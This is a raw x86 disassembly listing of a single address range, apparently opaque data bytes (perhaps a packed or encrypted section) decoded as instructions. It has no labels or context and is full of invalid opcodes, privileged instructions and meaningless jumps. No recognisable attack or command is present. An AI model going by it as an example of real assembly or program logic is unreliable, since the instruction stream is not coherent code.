  40ee75:	mov    ah,0xe1
  40ee77:	dec    esp
  40ee78:	mov    ds,WORD PTR [edx]
  40ee7a:	mov    ds:0x48d3d528,al
  40ee7f:	inc    eax
  40ee80:	inc    eax
  40ee81:	(bad)  
  40ee82:	mov    ebp,0x3d707998
  40ee87:	sahf   
  40ee88:	pop    ebp
  40ee89:	adc    eax,0x303a553
  40ee8e:	and    BYTE PTR [edx-0x78794e7],cl
  40ee94:	or     DWORD PTR [edi+0x373d4e24],0xf7dd48e6
  40ee9e:	std    
  40ee9f:	jle    0x40ee60
  40eea1:	jo     0x40eecd
  40eea3:	xor    BYTE PTR [edi-0x2cbfd32e],ch
  40eea9:	jbe    0x40ee2e
  40eeab:	add    BYTE PTR [esi+edx*2+0x17],al
  40eeaf:	push   edi
  40eeb0:	cs cdq 
  40eeb2:	push   esp
  40eeb3:	add    ah,BYTE PTR [esi-0x3]
  40eeb6:	rcl    DWORD PTR [eax+0x506c495],1
  40eebc:	mov    eax,0xb7eb402e
  40eec1:	push   ss
  40eec2:	mov    ds:0xedb73dee,eax
  40eec7:	push   esi
  40eec8:	repnz cmp ecx,edi
  40eecb:	ins    BYTE PTR es:[edi],dx
  40eecc:	idiv   DWORD PTR [ebx+0x4579eeeb]
  40eed2:	jmp    0x40eeba
  40eed4:	sbb    DWORD PTR [ebx+0x7a7a6020],eax
  40eeda:	call   0x868d:0x1a45c5c5
  40eee1:	int    0x23
  40eee3:	push   0xddbb7f20
  40eee8:	out    0xc2,al
  40eeea:	test   DWORD PTR [ebx],ecx
  40eeec:	je     0x40ef28
  40eeee:	sbb    eax,0x76602082
  40eef3:	jbe    0x40ef4b
  40eef5:	and    eax,0x19b274d1
  40eefa:	lds    esi,FWORD PTR [ecx-0x34]
  40eefd:	cli    
  40eefe:	cli    
  40eeff:	cmp    dl,BYTE PTR [edi+0x6b625d2e]
  40ef05:	imul   ecx,DWORD PTR [ebx],0xffffffcf
  40ef08:	repz fcomp st(2)
  40ef0b:	fcmovu st,st(2)
  40ef0d:	inc    eax
  40ef0e:	xchg   ebp,eax
  40ef0f:	pop    ss
  40ef10:	xor    eax,0x9b23cea3
  40ef15:	(bad)
  40ef19:	mov    edi,0xcf6797df
  40ef1e:	sahf   
  40ef1f:	pop    ebp
  40ef20:	cmp    edi,DWORD PTR [ebx-0xa]
  40ef23:	in     al,dx
  40ef24:	pop    ds
  40ef25:	add    cl,BYTE PTR [ecx+0x10]
  40ef28:	add    al,0xd5
  40ef2a:	(bad)
  40ef2d:	cdq    
  40ef2e:	xchg   DWORD PTR [esi],ebx
  40ef30:	jp     0x40ef1a
  40ef32:	into   
  40ef33:	cdq    
  40ef34:	cdq    
  40ef35:	cdq    
  40ef36:	mov    ebx,0x87e1e5be
  40ef3b:	out    dx,eax
  40ef3c:	mov    ebx,0x1f3bcee3
  40ef41:	sbb    BYTE PTR [edi],bl
  40ef43:	sbb    ebx,DWORD PTR [ebx]
  40ef45:	sbb    eax,DWORD PTR [esi-0x4e4a405f]
  40ef4b:	sar    edx,0xda
  40ef4e:	sbb    ch,ch
  40ef50:	push   esi
  40ef51:	dec    ebx
  40ef52:	sbb    DWORD PTR [edx],ebx
  40ef54:	jnp    0x40ef13
  40ef56:	or     al,0xfa
  40ef58:	xor    cl,BYTE PTR [eax]
  40ef5a:	out    dx,al
  40ef5b:	jbe    0x40ef75
  40ef5d:	dec    ecx
  40ef5e:	scas   eax,DWORD PTR es:[edi]
  40ef5f:	xlat   BYTE PTR ds:[ebx]
  40ef60:	or     al,0x72
  40ef62:	adc    DWORD PTR [esi+0x278b9167],ebx
  40ef68:	cmp    al,0x86
  40ef6a:	std    
  40ef6b:	nop
  40ef6c:	stos   DWORD PTR es:[edi],eax
  40ef6d:	ret    
  40ef6e:	jne    0x40ef1e
  40ef70:	scas   al,BYTE PTR es:[edi]
  40ef71:	outs   dx,BYTE PTR ds:[esi]
  40ef72:	jo     0x40ef56
  40ef74:	in     al,0x59
  40ef76:	sub    dl,BYTE PTR [ebp-0x72a54af6]
  40ef7c:	icebp  
  40ef7d:	icebp  
  40ef7e:	xor    DWORD PTR [esi],edx
  40ef80:	test   dh,0xf3
  40ef83:	out    dx,al
  40ef84:	xlat   BYTE PTR ds:[ebx]
  40ef85:	dec    edi
  40ef86:	repz fucomp st(7)
  40ef89:	pop    edx
  40ef8a:	and    al,0xe6
  40ef8c:	xor    bl,bl
  40ef8e:	lods   eax,DWORD PTR ds:[esi]
  40ef8f:	test   BYTE PTR [ebx+0x6b],cl
  40ef92:	sub    eax,0xc7a4fcbe
  40ef97:	jae    0x40efe8
  40ef99:	mov    ebp,0x163f1fc8
  40ef9e:	jae    0x40f015
  40efa0:	stc    
  40efa1:	adc    eax,0x447b3636
  40efa6:	popf   
  40efa7:	xor    DWORD PTR [eax],ebp
  40efa9:	aad    0x55
  40efab:	test   al,0x73
  40efad:	cmc    
  40efae:	and    BYTE PTR [edi+ecx*1-0x7d],dl
  40efb2:	out    dx,eax
  40efb3:	jecxz  0x40ef7e
  40efb5:	xor    ebp,DWORD PTR [eax+0xc8b4]
  40efbb:	and    BYTE PTR [eax],al
  40efbd:	dec    ecx
  40efbe:	inc    esp
  40efbf:	inc    ecx
  40efc0:	push   esp
  40efc1:	push   cs
  40efc2:	and    bl,dl
  40efc4:	test   BYTE PTR [eax+0xb],bh
  40efc7:	adc    DWORD PTR [ebp+0x23],ebp
  40efca:	jecxz  0x40ef82
  40efcc:	sahf   
  40efcd:	sbb    al,0xa5
  40efcf:	cdq    
  40efd0:	xor    al,0xb4
  40efd3:	(bad)  
  40efd4:	rol    BYTE PTR [ecx+0x53],0x40
  40efd8:	xchg   BYTE PTR [ecx],dh
  40efda:	or     BYTE PTR [ecx],al
  40efdc:	push   edx
  40efdd:	xor    eax,DWORD PTR [esi-0x500839dc]
  40efe3:	lods   eax,DWORD PTR ds:[esi]
  40efe4:	outs   dx,BYTE PTR ds:[esi]
  40efe5:	cli    
  40efe6:	mov    esi,0x25dbb74f
  40efeb:	mov    fs,WORD PTR [ebx-0x75]
  40efee:	push   es
  40efef:	aad    0x65
  40eff1:	add    al,0xc0
  40eff3:	in     eax,0x5b
  40eff5:	(bad)  
  40eff6:	leave  
  40eff7:	aaa    
  40eff8:	shr    BYTE PTR [esi+0x2a],1
  40effb:	and    DWORD PTR [eax-0x37750b6f],ecx
  40f001:	dec    ebp
  40f002:	add    al,BYTE PTR [ebx+edx*4+0x25]
  40f006:	and    eax,0x5a67e51b
  40f00b:	mov    esi,0x2b91400e
  40f010:	out    dx,eax
  40f011:	pop    edx
  40f012:	test   BYTE PTR [esp+eax*4+0x1a],bl
  40f016:	jbe    0x40f08a
  40f018:	add    DWORD PTR [esi],edx
  40f01a:	in     eax,dx
  40f01b:	iret   
  40f01c:	aas    
  40f01d:	dec    edi
  40f01e:	adc    DWORD PTR [ecx],edx
  40f020:	sbb    dh,ah
  40f022:	push   ebx
  40f023:	scas   eax,DWORD PTR es:[edi]
  40f024:	xlat   BYTE PTR ds:[ebx]
  40f025:	cdq    
  40f026:	cwde   
  40f027:	cwde   
  40f028:	pusha  
  40f029:	pop    edx
  40f02a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f02b:	(bad)  
  40f02c:	xor    bh,bl
  40f02e:	inc    eax
  40f02f:	mov    ecx,0xb6b6b701
  40f034:	fcomp  st(0)
  40f036:	fsub   DWORD PTR [eax-0x54ae1429]
  40f03c:	aad    0x58
  40f03e:	pop    esp
  40f03f:	pop    esp
  40f040:	fs jl  0x40f0bf
  40f043:	fcomp  QWORD PTR [edx]
  40f045:	jmp    0x40f029
  40f047:	cmp    BYTE PTR [esi-0x4e4d1225],ah
  40f04d:	mov    cl,0xc1
  40f04f:	xchg   ebp,eax
  40f050:	sub    edx,DWORD PTR [edi+0x68]
  40f053:	mov    bh,0xdb
  40f055:	lods   al,BYTE PTR ds:[esi]
  40f056:	scas   eax,DWORD PTR es:[edi]
  40f057:	scas   eax,DWORD PTR es:[edi]
  40f058:	pop    edi
  40f059:	pop    ecx
  40f05a:	pop    esi
  40f05b:	pop    esi
  40f05c:	jle    0x40f048
  40f05e:	aam    0xa9
  40f060:	push   ebx
  40f061:	pop    edi
  40f062:	jle    0x40f055
  40f064:	lds    edx,FWORD PTR [edi]
  40f066:	lahf   
  40f067:	inc    eax
  40f068:	and    DWORD PTR [eax],eax
  40f06a:	sti    
  40f06b:	push   0xab485fb9
  40f070:	ins    BYTE PTR es:[edi],dx
  40f071:	add    al,0x40
  40f073:	sbb    DWORD PTR [eax-0x79e6ebaf],edx
  40f079:	mov    al,0x2
  40f07b:	jl     0x40f06e
  40f07d:	out    0x7f,eax
  40f07f:	(bad)  
  40f080:	out    0xab,eax
  40f082:	rcl    ebx,cl
  40f084:	rcl    DWORD PTR [ebx-0x1f07c1f1],cl
  40f08a:	and    DWORD PTR [ebp+0xfbba5a5],0x687c3e1f
  40f094:	ins    BYTE PTR es:[edi],dx
  40f095:	ins    BYTE PTR es:[edi],dx
  40f096:	ins    BYTE PTR es:[edi],dx
  40f097:	jbe    0x40f0fa
  40f099:	jle    0x40f119
  40f09b:	sub    ch,BYTE PTR [eax]
  40f09d:	xchg   ebp,eax
  40f09e:	retfw  0x3041
  40f0a2:	jecxz  0x40f11d
  40f0a4:	pop    esi
  40f0a5:	xor    BYTE PTR [esi+ecx*1],bl
  40f0a8:	imul   ebx,DWORD PTR [ecx],0x84a8025b
  40f0ae:	sub    BYTE PTR [ecx-0x7c],dl
  40f0b1:	lock cmp al,0x3b
  40f0b4:	daa    
  40f0b5:	loope  0x40f08c
  40f0b7:	pusha  
  40f0b8:	or     dh,BYTE PTR [esi-0x64]
  40f0bb:	loopne 0x40f0dd
  40f0bd:	addr16 inc edi
  40f0bf:	pop    eax
  40f0c0:	js     0x40f080
  40f0c2:	dec    edi
  40f0c3:	sbb    al,0x45
  40f0c5:	mov    ah,0xdb
  40f0c7:	ins    DWORD PTR es:[edi],dx
  40f0c8:	(bad)  
  40f0ca:	ss xchg edi,eax
  40f0cc:	cs pop ebp
  40f0ce:	(bad)  
  40f0cf:	and    DWORD PTR [ebp+0x6cd9a25],esi
  40f0d5:	mov    bl,0xf3
  40f0d7:	xor    ecx,DWORD PTR [edi+ecx*4+0x6f5df18d]
  40f0de:	das    
  40f0df:	repz xchg ecx,eax
  40f0e1:	neg    ebp
  40f0e3:	inc    ebp
  40f0e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0e5:	pop    edi
  40f0e6:	inc    ebx
  40f0e7:	and    al,0x9
  40f0e9:	(bad)  
  40f0ea:	sbb    eax,0x89f6790b
  40f0ef:	stos   DWORD PTR es:[edi],eax
  40f0f0:	pop    esp
  40f0f1:	pop    esi
  40f0f2:	pop    ebp
  40f0f3:	out    0xdc,eax
  40f0f5:	dec    edx
  40f0f6:	enter  0xcaca,0xcb
  40f0fa:	pushf  
  40f0fb:	mov    esi,0xc41c24d4
  40f100:	stos   BYTE PTR es:[edi],al
  40f101:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f102:	inc    ecx
  40f103:	mov    edi,0xa879a504
  40f108:	in     al,dx
  40f109:	push   edi
  40f10a:	fiadd  WORD PTR [esi-0x27]
  40f10d:	and    DWORD PTR [edi+ecx*1-0x48eee0b7],0xffffff91
  40f115:	jb     0x40f0bf
  40f117:	and    bl,BYTE PTR [ebx+eiz*8]
  40f11a:	or     cl,BYTE PTR ds:[ecx+ecx*2+0x74e2f654]
  40f122:	push   ds
  40f123:	test   BYTE PTR [ecx+0x34844050],cl
  40f129:	push   0xffffffa1
  40f12b:	push   ss
  40f12c:	mov    ch,al
  40f12e:	push   ecx
  40f12f:	stos   BYTE PTR es:[edi],al
  40f130:	es inc ch
  40f133:	ins    DWORD PTR es:[edi],dx
  40f134:	cli    
  40f135:	mov    eax,0xa8bdff3e
  40f13a:	add    BYTE PTR [esi-0x2271c0db],ch
  40f140:	fidiv  DWORD PTR [ecx-0x52]
  40f143:	cmc    
  40f144:	xor    ecx,ecx
  40f146:	dec    esp
  40f147:	test   DWORD PTR [ebp+0x7e4ec8e3],0x37fd2570
  40f151:	push   edx
  40f152:	add    eax,0x799b7af8
  40f157:	push   ds
  40f158:	iret   
  40f159:	repz cwde 
  40f15b:	cwde   
  40f15c:	cwde   
  40f15d:	pusha  
  40f15e:	outs   dx,BYTE PTR ds:[esi]
  40f15f:	outs   dx,BYTE PTR ds:[esi]
  40f160:	mov    cs,ecx
  40f162:	leave  
  40f163:	dec    ecx
  40f164:	and    BYTE PTR [eax],0xc8
  40f167:	and    BYTE PTR [edx-0x2a3a54aa],bl
  40f16d:	stos   DWORD PTR es:[edi],eax
  40f16e:	push   edi
  40f16f:	pop    ecx
  40f170:	pop    ebx
  40f171:	pop    ebx
  40f172:	inc    ebx
  40f173:	dec    edx
  40f174:	leave  
  40f175:	aam    0xd4
  40f177:	adc    al,0x8b
  40f179:	mov    ecx,DWORD PTR [ebx-0x732a54ac]
  40f17f:	xchg   ecx,eax
  40f180:	jo     0x40f1ef
  40f182:	ins    DWORD PTR es:[edi],dx
  40f183:	lea    ecx,[ebx]
  40f185:	pop    ss
  40f186:	cs mov al,0xba
  40f189:	mov    edx,0x643870ca
  40f18e:	jnp    0x40f20b
  40f190:	sti    
  40f191:	loop   0x40f144
  40f193:	arpl   di,ax
  40f195:	(bad)  
  40f196:	loopne 0x40f171
  40f198:	addr16 lahf 
  40f19a:	std    
  40f19b:	jecxz  0x40f16a
  40f19d:	int    0xcd
  40f19f:	push   ebp
  40f1a0:	aam    0xb8
  40f1a2:	xor    DWORD PTR [ecx],edi
  40f1a4:	mov    ch,0x61
  40f1a6:	xchg   esp,eax
  40f1a7:	clc    
  40f1a8:	mov    ebx,DWORD PTR [eax+0x7dd67481]
  40f1ae:	jge    0x40f22e
  40f1b0:	cmp    eax,0x75649249
  40f1b5:	jne    0x40f16c
  40f1b7:	cmc    
  40f1b8:	fxch   st(7)
  40f1ba:	jle    0x40f1b2
  40f1bc:	pop    ecx
  40f1bd:	loopne 0x40f208
  40f1bf:	jge    0x40f18e
  40f1c1:	jb     0x40f168
  40f1c3:	push   edx
  40f1c4:	or     DWORD PTR [edx],ebp
  40f1c6:	xchg   ebp,eax
  40f1c7:	dec    edx
  40f1c8:	stc    
  40f1c9:	cmc    
  40f1ca:	scas   eax,DWORD PTR es:[edi]
  40f1cb:	jg     0x40f1ca
  40f1cd:	rcr    BYTE PTR [ebp-0x7862189],cl
  40f1d3:	rol    BYTE PTR [ecx-0x64288fd],0xcd
  40f1da:	outs   dx,DWORD PTR ds:[esi]
  40f1db:	jle    0x40f24d
  40f1dd:	iret   
  40f1de:	sahf   
  40f1df:	cmp    eax,0x468d1afb
  40f1e4:	mov    ch,0xb5
  40f1e6:	mov    ch,0xc5
  40f1e8:	aad    0xab
  40f1ea:	push   edi
  40f1eb:	(bad)  
  40f1ed:	fsub   DWORD PTR [eax+0x7b]
  40f1f0:	jnp    0x40f24d
  40f1f2:	int    0x85
  40f1f4:	shl    BYTE PTR [ecx],1
  40f1f6:	stos   BYTE PTR es:[edi],al
  40f1f7:	stc    
  40f1f8:	call   0xbdce:0x3e90df8a
  40f1ff:	ins    BYTE PTR es:[edi],dx
  40f200:	out    0xca,al
  40f202:	scas   al,BYTE PTR es:[edi]
  40f203:	add    al,cl
  40f205:	popf   
  40f206:	adc    DWORD PTR [edx+ebp*1-0x62d7ae56],0xffffffdb
  40f20e:	and    BYTE PTR [ebx-0x4e4de3d0],ch
  40f214:	ds pusha 
  40f216:	ins    DWORD PTR es:[edi],dx
  40f217:	jge    0x40f276
  40f219:	cmp    eax,0x95b236b3
  40f21e:	retf   0x413e
  40f221:	push   eax
  40f222:	bound  esi,QWORD PTR [ecx-0x46]
  40f225:	leave  
  40f226:	inc    ebx
  40f227:	pop    ds
  40f228:	cdq    
  40f229:	daa    
  40f22a:	test   al,0x1c
  40f22c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f22d:	push   esp
  40f22e:	outs   dx,BYTE PTR ds:[esi]
  40f22f:	push   edx
  40f230:	cs xchg ebp,eax
  40f232:	mov    DWORD PTR [ebp-0x40],esp
  40f235:	pusha  
  40f236:	xor    al,ah
  40f238:	jae    0x40f299
  40f23a:	mov    edi,DWORD PTR [ecx-0x12]
  40f23d:	icebp  
  40f23e:	xchg   ebx,eax
  40f23f:	cmp    al,0x72
  40f241:	adc    al,0x5e
  40f243:	jns    0x40f226
  40f245:	sub    bl,BYTE PTR [ebx-0x62db5415]
  40f24b:	xor    eax,esi
  40f24d:	retf   
  40f24e:	rcr    al,1
  40f250:	add    esi,ebp
  40f252:	ret    
  40f253:	mov    BYTE PTR [eax+0x2a4af082],ah
  40f259:	mov    esp,0xd10ab879
  40f25e:	push   ss
  40f25f:	inc    esp
  40f260:	sbb    ecx,eax
  40f262:	jo     0x40f277
  40f264:	push   eax
  40f265:	icebp  
  40f266:	or     ah,BYTE PTR [eax+0x1b56e012]
  40f26c:	xchg   edx,eax
  40f26d:	sti    
  40f26e:	out    dx,al
  40f26f:	imul   esi,DWORD PTR [eax],0xe4818a74
  40f275:	mov    ebp,0x5befbe56
  40f27a:	xor    al,0x6
  40f27c:	sbb    ecx,esp
  40f27e:	shl    esi,cl
  40f280:	push   ebp
  40f281:	retf   0x6003
  40f284:	fisubr DWORD PTR [esi+0x25aa00bd]
  40f28a:	call   0xb097:0x145555d8
  40f291:	pop    ebp
  40f292:	add    cl,BYTE PTR [edi-0x6e]
  40f295:	cwde   
  40f296:	cmp    dh,cl
  40f298:	xor    al,BYTE PTR [eax]
  40f29a:	xlat   BYTE PTR ds:[ebx]
  40f29b:	push   es
  40f29c:	lock cmc 
  40f29e:	stos   BYTE PTR es:[edi],al
  40f29f:	add    BYTE PTR [edi],dh
  40f2a1:	loop   0x40f2d8
  40f2a3:	sub    BYTE PTR [edx-0x9912662],bh
  40f2a9:	aad    0x6a
  40f2ab:	xor    eax,0x9fdfeff6
  40f2b0:	sub    edi,0xd7af5f66
  40f2b6:	jecxz  0x40f2b4
  40f2b8:	stc    
  40f2b9:	rep lods al,BYTE PTR ds:[esi]
  40f2bb:	scas   al,BYTE PTR es:[edi]
  40f2bc:	scas   al,BYTE PTR es:[edi]
  40f2bd:	xchg   edx,eax
  40f2be:	and    al,0x9
  40f2c0:	rcl    ebx,cl
  40f2c2:	shr    DWORD PTR [ebp*1+0x56ad512d],cl
  40f2c9:	xor    esi,edi
  40f2cb:	outs   dx,BYTE PTR ds:[esi]
  40f2cc:	mov    ch,0x5a
  40f2ce:	pushf  
  40f2cf:	cmp    eax,0xe5e5967b
  40f2d4:	gs loop 0x40f30f
  40f2d7:	es or  al,0xc3
  40f2da:	rcl    DWORD PTR [ebx+0x4f],0x3d
  40f2de:	cmc    
  40f2df:	imul   ecx,edi,0x3d
  40f2e2:	neg    esp
  40f2e4:	pop    ds
  40f2e5:	ins    DWORD PTR es:[edi],dx
  40f2e6:	ins    BYTE PTR es:[edi],dx
  40f2e7:	ins    BYTE PTR es:[edi],dx
  40f2e8:	lods   al,BYTE PTR ds:[esi]
  40f2e9:	mov    eax,ds:0xa129b8a4
  40f2ee:	jmp    0x40f302
  40f2f0:	mov    ecx,0xdbafceb8
  40f2f5:	not    edx
  40f2f7:	stc    
  40f2f8:	push   ebx
  40f2f9:	dec    edx
  40f2fa:	lods   al,BYTE PTR ds:[esi]
  40f2fb:	bound  ecx,QWORD PTR [eax]
  40f2fd:	gs mov ebp,0xc18012d
  40f303:	push   es
  40f304:	leave  
  40f305:	pusha  
  40f306:	xor    al,ch
  40f308:	cmp    eax,0xc723c8f2
  40f30d:	push   ds
  40f30e:	jns    0x40f2f4
  40f310:	xchg   ecx,eax
  40f311:	add    DWORD PTR [bx+di-0x51],edx
  40f315:	xlat   BYTE PTR ds:[ebx]
  40f316:	(bad)  
  40f317:	out    dx,al
  40f318:	cmp    al,0x7c
  40f31a:	js     0x40f312
  40f31c:	fwait
  40f31d:	out    dx,eax
  40f31e:	mov    edi,0x47239eff
  40f323:	mov    ds,esp
  40f325:	sti    
  40f326:	lock ret 
  40f328:	(bad)  
  40f32a:	jo     0x40f390
  40f32c:	popa   
  40f32d:	loope  0x40f30f
  40f32f:	clc    
  40f330:	clc    
  40f331:	js     0x40f2f0
  40f333:	shr    DWORD PTR [esi-0x4d],cl
  40f336:	jp     0x40f32d
  40f338:	sub    bl,BYTE PTR [ebp-0x4a0a78b2]
  40f33e:	xor    eax,0x4daedd7a
  40f343:	pop    edi
  40f344:	in     eax,dx
  40f345:	(bad)  
  40f346:	push   esp
  40f347:	xor    al,0x7d
  40f349:	mov    bh,0xdb
  40f34b:	xchg   esi,eax
  40f34c:	daa    
  40f34d:	js     0x40f2d3
  40f34f:	jno    0x40f324
  40f351:	adc    eax,0x526a2bec
  40f356:	fisubr DWORD PTR [ecx+0x7b8516a5]
  40f35c:	sahf   
  40f35d:	rcr    BYTE PTR [edi-0x6a5b667c],cl
  40f363:	nop
  40f364:	hlt    
  40f365:	adc    eax,DWORD PTR [esi]
  40f367:	test   BYTE PTR [ebx+ebx*8+0x5797965d],dh
  40f36e:	push   esp
  40f36f:	lods   al,BYTE PTR ds:[esi]
  40f370:	inc    edx
  40f371:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f372:	inc    esp
  40f373:	mov    ds:0x4a7a60d1,eax
  40f378:	fldenv [ebp+0x3e]
  40f37b:	lock xchg esi,eax
  40f37d:	dec    ecx
  40f37e:	ds (bad) 
  40f380:	pop    ss
  40f381:	mov    esi,0x625c7e99
  40f386:	rcl    BYTE PTR [ebx-0x6f1a1284],1
  40f38c:	scas   eax,DWORD PTR es:[edi]
  40f38d:	dec    cl
  40f38f:	sbb    ch,BYTE PTR [ebx]
  40f391:	sub    esp,DWORD PTR [edi-0x49503c08]
  40f397:	mov    eax,0xed18f27a
  40f39c:	mov    ch,0x6
  40f39e:	jb     0x40f348
  40f3a0:	sbb    edx,eax
  40f3a2:	fdivr  DWORD PTR [esp+edx*8]
  40f3a5:	punpcklwd mm6,DWORD PTR [edx]
  40f3a8:	and    DWORD PTR [ebx-0x2f],edi
  40f3ab:	cmp    al,BYTE PTR [ebx+ebx*4+0x10]
  40f3af:	scas   al,BYTE PTR es:[edi]
  40f3b0:	shl    BYTE PTR [eax-0x7d],0x5a
  40f3b4:	lods   eax,DWORD PTR ds:[esi]
  40f3b5:	ret    
  40f3b6:	loop   0x40f37a
  40f3b8:	sbb    bl,al
  40f3ba:	mov    al,0xef
  40f3bc:	cmp    al,0xee
  40f3be:	sub    dl,dh
  40f3c0:	ins    BYTE PTR es:[edi],dx
  40f3c1:	mov    bh,0xdb
  40f3c3:	inc    ebp
  40f3c4:	mov    WORD PTR [ebp+0x1b],?
  40f3c7:	aaa    
  40f3c8:	icebp  
  40f3c9:	loopne 0x40f376
  40f3cb:	shl    BYTE PTR [esi+0x65],1
  40f3ce:	add    al,0x4
  40f3d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3d1:	test   DWORD PTR [edi],0x8d1a0306
  40f3d7:	xchg   BYTE PTR [esi-0x1ffba603],al
  40f3dd:	sbb    bh,dh
  40f3df:	fsub   st(7),st
  40f3e1:	imul   ebp,DWORD PTR [edx],0xf54516a1
  40f3e7:	in     eax,0xdb
  40f3e9:	lea    ebp,[edx+0x4c7a3700]
  40f3ef:	fidiv  WORD PTR [eax]
  40f3f1:	push   0xd9b37e24
  40f3f6:	mov    ah,0x7a
  40f3f8:	mov    ebx,0xfecccdd1
  40f3fd:	dec    esi
  40f3fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3ff:	ret    
  40f400:	retf   0x8aca
  40f403:	and    eax,0x49c9c9fc
  40f408:	push   ss
  40f409:	push   ss
  40f40a:	push   ss
  40f40b:	sbb    BYTE PTR [ebx],bl
  40f40d:	sbb    ecx,ebx
  40f40f:	and    al,0x79
  40f411:	fcomp  st(6)
  40f413:	fsubrp st(6),st
  40f415:	fdivr  QWORD PTR [ecx+0x7cbe5c73]
  40f41b:	cdq    
  40f41c:	dec    esi
  40f41d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f41e:	ret    
  40f41f:	div    dh
  40f421:	div    dh
  40f423:	repnz repnz repnz push edi
  40f427:	mov    ds,WORD PTR [edi]
  40f429:	aas    
  40f42a:	(bad)  
  40f42b:	fnstenv [ebx]
  40f42d:	addr16 into 
  40f42f:	mov    esp,0xa6d02284
  40f434:	mov    ecx,0x9042053d
  40f439:	sub    al,0xd1
  40f43b:	jecxz  0x40f459
  40f43d:	fwait
  40f43e:	dec    ebp
  40f440:	xor    eax,DWORD PTR [edx+0x36a37efc]
  40f446:	call   0x28455ae5
  40f44b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f44c:	and    edi,DWORD PTR [ebx-0xb8b9123]
  40f452:	stc    
  40f453:	out    0x2f,eax
  40f455:	sbb    al,0x7d
  40f457:	(bad)  
  40f458:	stc    
  40f459:	push   ebx
  40f45a:	shl    BYTE PTR [edi+0x6a],0xb5
  40f45e:	pop    edx
  40f45f:	jae    0x40f4cf
  40f461:	outs   dx,BYTE PTR ds:[esi]
  40f462:	outs   dx,BYTE PTR ds:[esi]
  40f463:	cli    
  40f464:	mov    eax,ds:0x783a1e87
  40f469:	(bad)  
  40f46a:	std    
  40f46b:	idiv   DWORD PTR [edi]
  40f46d:	hlt    
  40f46e:	out    0xdf,eax
  40f470:	hlt    
  40f471:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f472:	xlat   BYTE PTR ds:[ebx]
  40f473:	in     al,dx
  40f474:	fnsave [edi+0x7743ceef]
  40f47a:	fcom   QWORD PTR [ecx-0x69]
  40f47d:	push   eax
  40f47e:	sbb    DWORD PTR [ebx+edi*4-0xc],esi
  40f482:	pop    es
  40f483:	add    esp,DWORD PTR [ebp-0x45]
  40f486:	fcomp  st(0)
  40f488:	mov    al,0xf6
  40f48a:	getsec 
  40f48c:	aam    0x39
  40f48e:	lods   eax,DWORD PTR ds:[esi]
  40f48f:	(bad)  
  40f491:	add    ecx,DWORD PTR [ecx+eax*2+0xf9d231b]
  40f498:	mov    eax,ds:0x10da74dd
  40f49d:	and    ah,BYTE PTR ds:0x9a8a44d2
  40f4a3:	ins    DWORD PTR es:[edi],dx
  40f4a4:	out    0x1c,al
  40f4a6:	int    0x30
  40f4a8:	pop    esp
  40f4a9:	adc    DWORD PTR [ecx+0x178db6bf],0x410bf774
  40f4b3:	adc    al,0x25
  40f4b5:	ins    BYTE PTR es:[edi],dx
  40f4b6:	ins    DWORD PTR es:[edi],dx
  40f4b7:	outs   dx,BYTE PTR ds:[esi]
  40f4b8:	mov    bl,0xb9
  40f4ba:	mov    cl,0x5
  40f4bc:	inc    edx
  40f4bd:	jo     0x40f4fb
  40f4bf:	or     BYTE PTR [eax-0x7073346c],ch
  40f4c5:	xor    eax,0xf38c4e68
  40f4ca:	out    0x96,eax
  40f4cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4cd:	jns    0x40f4c6
  40f4cf:	fistp  WORD PTR [ecx+0x76c2de04]
  40f4d5:	dec    edi
  40f4d6:	mov    al,0xba
  40f4d8:	fsubrp st(5),st
  40f4da:	idiv   DWORD PTR [edi-0x198a4e16]
  40f4e0:	sub    al,0xbf
  40f4e2:	call   FWORD PTR [eax-0x75]
  40f4e5:	push   edi
  40f4e6:	sahf   
  40f4e7:	cmp    DWORD PTR [edx-0x41],ecx
  40f4ea:	mov    ebx,0x46993f45
  40f4ef:	xor    esp,DWORD PTR es:[ecx+esi*8]
  40f4f3:	adc    al,0x88
  40f4f5:	inc    ebp
  40f4f6:	test   al,0x1f
  40f4f8:	test   BYTE PTR [edx+0x9],ch
  40f4fb:	outs   dx,DWORD PTR ds:[esi]
  40f4fc:	cld    
  40f4fd:	adc    eax,0xbf490d9a
  40f502:	xlat   BYTE PTR ds:[ebx]
  40f503:	inc    ecx
  40f504:	gs xor dl,cl
  40f507:	stos   BYTE PTR es:[edi],al
  40f508:	add    BYTE PTR [esi],ah
  40f50a:	xchg   esi,eax
  40f50b:	arpl   WORD PTR [eax],di
  40f50d:	sub    al,0x9c
  40f50f:	sub    eax,ebx
  40f511:	push   es
  40f512:	pop    esi
  40f513:	xchg   ebp,eax
  40f514:	imul   eax,eax,0xdd2eda6
  40f51a:	test   al,0x2a
  40f51c:	mov    al,ds:0xa41d7af4
  40f521:	pushf  
  40f522:	rcl    BYTE PTR [edx+0x34],cl
  40f525:	(bad)  
  40f526:	mov    eax,0x401b5d03
  40f52b:	push   0xfffffff4
  40f52d:	shl    DWORD PTR [edi],cl
  40f52f:	or     al,BYTE PTR [edx-0x5d5646b4]
  40f535:	jbe    0x40f574
  40f537:	arpl   di,bx
  40f539:	mov    ch,0x8e
  40f53b:	das    
  40f53c:	xor    dh,ah
  40f53e:	adc    eax,0xb56ab1c1
  40f543:	retf   0xe4e4
  40f546:	and    al,0xe3
  40f548:	jecxz  0x40f52d
  40f54a:	mov    WORD PTR [ebp+0xfa8598d],cs
  40f550:	shr    bh,1
  40f552:	neg    ecx
  40f554:	fcomp  st(0)
  40f556:	pusha  
  40f557:	arpl   WORD PTR [ebx-0x7d],sp
  40f55a:	push   esi
  40f55b:	stos   DWORD PTR es:[edi],eax
  40f55c:	inc    ebp
  40f55d:	mov    ch,0x5a
  40f55f:	imul   ebp,DWORD PTR gs:[ecx-0x77],0xea49c9c9
  40f567:	cmc    
  40f568:	mov    edx,0x4e9d0745
  40f56d:	xchg   DWORD PTR [ebx-0x1a8dd0e9],ecx
